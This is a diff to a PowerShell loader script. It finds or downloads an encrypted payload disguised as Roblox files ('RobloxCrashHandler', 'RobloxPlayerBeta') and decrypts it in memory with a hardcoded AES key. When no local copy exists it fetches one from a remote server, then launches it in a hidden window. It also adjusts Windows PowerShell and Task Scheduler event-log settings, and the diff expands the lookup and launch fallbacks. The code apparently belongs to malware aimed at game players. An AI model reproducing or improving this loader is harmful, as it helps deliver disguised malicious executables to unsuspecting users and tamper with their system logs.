@@ -536,40 +536,84 @@ Write-Host "[2/4] Loading payload into RAM..." -ForegroundColor Yellow
 
 $exeBytes = $null
 $resolvedPath = if ($actualWorkspace) { $actualWorkspace } else { $scriptRoot }
-$localExe = Join-Path $resolvedPath "build\RobloxCrashHandler.exe"
-$localServerExe = Join-Path $resolvedPath "updates-server\uploads\RobloxCrashHandler.exe"
 
-if (Test-Path $localExe) {
-    Write-Host "    Found locally compiled executable at $localExe." -ForegroundColor Green
+$candidateExePaths = @(
+    (Join-Path $resolvedPath "build\RobloxCrashHandler.exe"),
+    (Join-Path $resolvedPath "build\RobloxCrashHandler_fallback.exe"),
+    (Join-Path $resolvedPath "my private\build\RobloxCrashHandler.exe"),
+    (Join-Path $resolvedPath "my private\build\RobloxCrashHandler_fallback.exe"),
+    (Join-Path $scriptRoot "build\RobloxCrashHandler.exe"),
+    (Join-Path $scriptRoot "build\RobloxCrashHandler_fallback.exe"),
+    (Join-Path $scriptRoot "my private\build\RobloxCrashHandler.exe"),
+    (Join-Path $scriptRoot "my private\build\RobloxCrashHandler_fallback.exe"),
+    (Join-Path $resolvedPath "updates-server\uploads\RobloxCrashHandler.exe"),
+    (Join-Path $resolvedPath "my private\updates-server\uploads\RobloxCrashHandler.exe"),
+    (Join-Path $scriptRoot "updates-server\uploads\RobloxCrashHandler.exe"),
+    (Join-Path $scriptRoot "my private\updates-server\uploads\RobloxCrashHandler.exe")
+)
+
+$localExe = $candidateExePaths | Where-Object { Test-Path $_ } | Select-Object -First 1
+
+if ($localExe) {
+    Write-Host "    Found executable at $localExe." -ForegroundColor Green
     Write-Host "    Loading compiled binary directly..." -ForegroundColor Green
     $exeBytes = [System.IO.File]::ReadAllBytes($localExe)
-} elseif (Test-Path $localServerExe) {
-    Write-Host "    Found local server executable at $localServerExe." -ForegroundColor Green
-    Write-Host "    Loading server binary directly..." -ForegroundColor Green
-    $exeBytes = [System.IO.File]::ReadAllBytes($localServerExe)
 } else {
-    Write-Host "    No local builds found. Downloading from remote server..." -ForegroundColor Yellow
-    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
-    $wc       = New-Object System.Net.WebClient
-    try {
-        $encBytes = $wc.DownloadData("$ServerBaseUrl/RobloxCrashHandler.enc")
-        
-        $DecKey = [byte[]](0x54,0x55,0x4E,0x47,0x57,0x41,0x52,0x45,0x32,0x35,0x36,0x4B,0x45,0x59,0x21,0x40,
-                           0x24,0x25,0x5E,0x26,0x2A,0x28,0x29,0x5F,0x2B,0x3D,0x7B,0x7D,0x7C,0x3A,0x3B,0x22)
-        $DecIV  = [byte[]](0x52,0x43,0x48,0x5F,0x49,0x56,0x5F,0x54,0x55,0x4E,0x47,0x57,0x41,0x52,0x45,0x21)
-        
-        $aes         = [System.Security.Cryptography.Aes]::Create()
-        $aes.Key     = $DecKey
-        $aes.IV      = $DecIV
-        $aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
-        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
-        $dec         = $aes.CreateDecryptor()
-        $exeBytes    = $dec.TransformFinalBlock($encBytes, 0, $encBytes.Length)
-        $aes.Dispose()
-        Write-Host "    Payload downloaded and decrypted in RAM." -ForegroundColor Green
-    } catch {
-        Write-Host "    ERROR: Failed to download remote payload: $_" -ForegroundColor Red
-        Exit 1
+    $candidateEncPaths = @(
+        (Join-Path $resolvedPath "updates-server\uploads\RobloxCrashHandler.enc"),
+        (Join-Path $resolvedPath "my private\updates-server\uploads\RobloxCrashHandler.enc"),
+        (Join-Path $scriptRoot "updates-server\uploads\RobloxCrashHandler.enc"),
+        (Join-Path $scriptRoot "my private\updates-server\uploads\RobloxCrashHandler.enc"),
+        (Join-Path $resolvedPath "RobloxPlayerBeta.enc"),
+        (Join-Path $resolvedPath "my private\RobloxPlayerBeta.enc"),
+        (Join-Path $scriptRoot "RobloxPlayerBeta.enc"),
+        (Join-Path $scriptRoot "my private\RobloxPlayerBeta.enc")
+    )
+    $localEnc = $candidateEncPaths | Where-Object { Test-Path $_ } | Select-Object -First 1
+    if ($localEnc) {
+        Write-Host "    Found local encrypted payload at $localEnc. Decrypting..." -ForegroundColor Green
+        try {
+            $encBytes = [System.IO.File]::ReadAllBytes($localEnc)
+            $DecKey = [byte[]](0x54,0x55,0x4E,0x47,0x57,0x41,0x52,0x45,0x32,0x35,0x36,0x4B,0x45,0x59,0x21,0x40,
+                               0x24,0x25,0x5E,0x26,0x2A,0x28,0x29,0x5F,0x2B,0x3D,0x7B,0x7D,0x7C,0x3A,0x3B,0x22)
+            $DecIV  = [byte[]](0x52,0x43,0x48,0x5F,0x49,0x56,0x5F,0x54,0x55,0x4E,0x47,0x57,0x41,0x52,0x45,0x21)
+            $aes         = [System.Security.Cryptography.Aes]::Create()
+            $aes.Key     = $DecKey
+            $aes.IV      = $DecIV
+            $aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
+            $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+            $dec         = $aes.CreateDecryptor()
+            $exeBytes    = $dec.TransformFinalBlock($encBytes, 0, $encBytes.Length)
+            $aes.Dispose()
+            Write-Host "    Local payload decrypted successfully." -ForegroundColor Green
+        } catch {
+            Write-Host "    WARNING: Local decryption failed: $_" -ForegroundColor Yellow
+        }
+    }
+    if (-not $exeBytes) {
+        Write-Host "    No local builds found. Downloading from remote server..." -ForegroundColor Yellow
+        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
+        $wc       = New-Object System.Net.WebClient
+        try {
+            $encBytes = $wc.DownloadData("$ServerBaseUrl/RobloxCrashHandler.enc")
+            
+            $DecKey = [byte[]](0x54,0x55,0x4E,0x47,0x57,0x41,0x52,0x45,0x32,0x35,0x36,0x4B,0x45,0x59,0x21,0x40,
+                               0x24,0x25,0x5E,0x26,0x2A,0x28,0x29,0x5F,0x2B,0x3D,0x7B,0x7D,0x7C,0x3A,0x3B,0x22)
+            $DecIV  = [byte[]](0x52,0x43,0x48,0x5F,0x49,0x56,0x5F,0x54,0x55,0x4E,0x47,0x57,0x41,0x52,0x45,0x21)
+            
+            $aes         = [System.Security.Cryptography.Aes]::Create()
+            $aes.Key     = $DecKey
+            $aes.IV      = $DecIV
+            $aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
+            $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+            $dec         = $aes.CreateDecryptor()
+            $exeBytes    = $dec.TransformFinalBlock($encBytes, 0, $encBytes.Length)
+            $aes.Dispose()
+            Write-Host "    Payload downloaded and decrypted in RAM." -ForegroundColor Green
+        } catch {
+            Write-Host "    ERROR: Failed to download remote payload: $_" -ForegroundColor Red
+            Exit 1
+        }
     }
 }
 
@@ -789,12 +833,24 @@ function Start-PrivateBrowser([string]$url) {
         Start-Process $url
     }
 }
-if ($started) {
-    Write-Host "Loader is running. Opening website in browser..." -ForegroundColor Green
-    Start-PrivateBrowser "http://127.0.0.1:9876"
-} else {
-    Write-Host "WARNING: Loader did not respond within 20 seconds." -ForegroundColor Yellow
+if (-not $started) {
+    Write-Host "Loader port 9876 not active yet, launching binary directly..." -ForegroundColor Yellow
+    if ($localExe -and (Test-Path $localExe)) {
+        Start-Process -FilePath $localExe -WindowStyle Hidden
+    } else {
+        $directCandidates = @(
+            (Join-Path $resolvedPath "my private\build\RobloxCrashHandler.exe"),
+            (Join-Path $scriptRoot "my private\build\RobloxCrashHandler.exe"),
+            (Join-Path $resolvedPath "build\RobloxCrashHandler.exe")
+        )
+        $directBin = $directCandidates | Where-Object { Test-Path $_ } | Select-Object -First 1
+        if ($directBin) { Start-Process -FilePath $directBin -WindowStyle Hidden }
+    }
+    Start-Sleep -Seconds 2
 }
+
+Write-Host "Opening website in browser..." -ForegroundColor Green
+Start-PrivateBrowser "http://127.0.0.1:9876"
 
 wevtutil.exe sl "Microsoft-Windows-PowerShell/Operational"   /e:true 2>$null
 wevtutil.exe sl "Microsoft-Windows-TaskScheduler/Operational" /e:true 2>$null
